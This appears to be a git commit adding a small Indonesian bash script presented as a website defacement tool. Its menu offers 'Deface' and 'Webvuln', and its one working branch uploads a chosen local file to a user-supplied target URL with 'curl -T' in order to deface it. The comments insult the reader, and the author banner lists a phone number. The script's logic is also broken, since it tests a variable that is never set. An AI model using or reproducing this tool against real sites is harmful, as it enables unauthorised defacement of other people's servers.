5ebb27032847a330eb89897127595e97a5020b4b
Labib/Mine7 <46355160+MyLovee@users.noreply.github.com>
2019-02-04 15:58:41 +0700

    Add files via upload

---
+++ IDS.sh
@@ -0,0 +1,42 @@
+clear
+#!/system/xbin/bash
+#ngapain lu bangsat                                                     
+#mau record?
+#apa faedah nya?#biar di bilang mastah?                                 
+#kok gua ngukuk ya
+#lu ngerecord gak bakal ngubah lu jadi mastah goblok                    
+#klo gak suka gelud aja kyta!1!1
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#colors
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo $cyan
+figlet  "tolls Deface"
+echo $cyan"====================================================================="
+echo $cyan" [*]$cyan############################################################$cyan[*]"
+echo $cyan" |*|  $yellow        Author   : ./Kagamine404                          $cyan|*|"
+echo $cyan" |*|  $yellow        Team     : Indonesian Darkness                  $cyan  |*|"
+echo $cyan" |*|  $yellow        Contact  : 0895378276565                       $cyan   |*|"
+echo $cyan" [*]############################################################[*]"
+echo ""
+echo $cyan"[1]Deface"
+echo $cyan"[2]Webvuln"
+echo $cyan"[3]Bikin sc depes"
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+read -p "[MrB4J1N64N]>" target
+echo "Masukan Nama script kalian"
+echo "yang ada di Luar Folder Ruang Penyimpanan"                                                      
+read -p "[MrB4J1N64N]>" script
+curl -T /storage/emulated/0/$script $target
+echo "\033[33;1m"                                                                                     
+echo "Selesai! Tod Cek di $target $script "
+fi
+
